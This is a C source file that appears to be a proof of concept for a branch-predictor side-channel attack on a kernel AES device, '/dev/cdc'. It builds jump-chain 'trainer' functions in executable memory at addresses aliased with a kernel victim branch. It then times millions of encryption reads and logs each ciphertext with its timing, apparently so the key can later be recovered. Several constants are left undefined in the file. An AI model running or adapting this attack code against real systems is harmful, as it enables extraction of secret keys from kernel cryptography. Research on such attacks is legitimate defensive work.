#define _GNU_SOURCE
#include <sched.h>

#include <stdio.h>
#include <stdint.h>
#include <assemblyline.h>
#include <stdlib.h>
#include <time.h>
#include <sys/mman.h>
#include <x86intrin.h>
#include <string.h>
#include <ctype.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <sys/syscall.h>

#define SAMPLES 10000000 //Enough for 14 chained jumps // Generate plaintext 
#define REPEAT 1 //0000
#define memory_barrier asm volatile ("mfence;\nsfence;\nlfence");
static uint64_t rdtscp64();
void delayloop(uint32_t cycles);
void *create_buffer(uint64_t adrs, int size);
void *create_trainer2(uint64_t adrs, int size, int distance);

#define LOW_MASK  0x7FFFFFFFF000


typedef uint8_t aes_t[16];
char* toString(aes_t aes)
{
	char buf[16 * 2 + 1];
	for (int i = 0; i < 16; i++) {
		sprintf(buf + i*2, "%02x", aes[i]);
	}
	return strdup(buf);
}
void randaes(aes_t aes) {
	for (int i = 0; i < 16; i++)
		aes[i] = rand() & 0xff;
}

int main(int argc, char *argv[])
{
	//volatile int a = syscall(__NR_assignColors, 0xf);
	// Randomly decide take or not take the branch
	// It taken, we should observe cache hit otherwise it is a cache miss
	uint64_t timing = 0, overall_timing = 0;
	uint8_t ciphertext[100000][16];
	int taken = (atoi(argv[1])%2);
	char * pt,* ct;
	srand(time(0));

	int fetch_code_skip = 64;
	memory_barrier

	// Open device
	uint8_t data[16] = {	0x00,0x00,0x00,0x00,
				0x00,0x00,0x00,0x00,
				0x00,0x00,0x00,0x00,
				0x00,0x00,0x00,0x00};
	int fd = open("/dev/cdc", O_RDONLY);

	int size = 1ULL<<19;
	int branch_offset = 5;
	
	uint64_t trainer_address[16];
	uint64_t trainer_target[16];
    void (*trainer[16])();
	int train_set = 16;

	// Align with kernel NOP jump, victim_function_start + branch_offset
	for (int i = 0; i < train_set; i++) {
        trainer_address[i] = BASE + (OFFSET + i * fetch_code_skip);
        trainer_target[i] = trainer_address[i] + attack_offset * (i+1) - fetch_code_skip * i + 0x3f;
    }

	// Align the trainer functino Contains victim JUMP
	for (int i = 0; i < train_set; i++) {
        trainer_address[i] = trainer_address[i] ^ ((uint64_t)i << 33);
        trainer_target[i] = trainer_target[i] ^ ((uint64_t)i << 33);
		trainer[i] = create_trainer2(trainer_address[i], size, trainer_target[i]);
    }
		

	FILE *f = fopen("result_0xff.txt", "w");

        int res = read(fd, &data, 16);
        memory_barrier
		
for (int s = 0; s < SAMPLES; s++) {
	randaes(data);
	pt = toString(data);
	overall_timing = 0;
    for (int loop = 0; loop < REPEAT; loop++) {

	memory_barrier
	memory_barrier
	memory_barrier
    #if train 
        trainer[0]();
        trainer[1]();
        memory_barrier
    #endif

        memory_barrier

        timing = rdtscp64();
        res = read(fd, &data, 16);
        timing = rdtscp64() - timing;
        overall_timing += timing;

        memory_barrier
        memory_barrier
        memory_barrier
	
    }
	ct = toString(data);
	fprintf(f, "%s %ld\n", ct, overall_timing / REPEAT);
}
	fclose(f);

}

static uint64_t rdtscp64()
{
    uint32_t low, high;
    asm volatile("rdtscp": "=a"(low), "=d"(high)::"ecx");
    return (((uint64_t)high) << 32) | low;
}

void delayloop(uint32_t cycles)
{
    uint64_t start = rdtscp64();
    while ((rdtscp64() - start) < cycles)
        ;
}


void *create_trainer2(uint64_t adrs, int size, int distance)
{
    int i;
    void *buffer = create_buffer((adrs & LOW_MASK), size);
    assemblyline_t al = asm_create_instance(buffer + (adrs & 0xFFF), size);
    
    int jmp_distance = distance - adrs - 5;
    
    char str_distance[10];
    sprintf(str_distance, "%d", jmp_distance);
    char str_jmp[20] = "jmp ";
    strcat(str_jmp, str_distance);

    asm_assemble_str(al, str_jmp);

    for (i = 0; i < jmp_distance; i++)
        asm_assemble_str(al, "NOP");
#if 1
    for (int i = 0; i < 12; i++) {
        asm_assemble_str(al, "JMP 4091");
        for (int t = 0; t < 4091; t++)
            asm_assemble_str(al, "NOP");
    }
#endif
    asm_assemble_str(al, "RET");

    void (*func)() = asm_get_code(al);
    asm_destroy_instance(al);
    return func;
}


void *create_buffer(uint64_t adrs, int size)
{
    void* buffer = (void*)mmap( (void*)(adrs & LOW_MASK), size,
			    PROT_READ | PROT_WRITE | PROT_EXEC,
			    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE | MAP_POPULATE,
			    -1, 0);
    if (buffer == MAP_FAILED) {
        printf("Fail to allocate memory\n");
        exit(1);
    }
    return buffer;
}
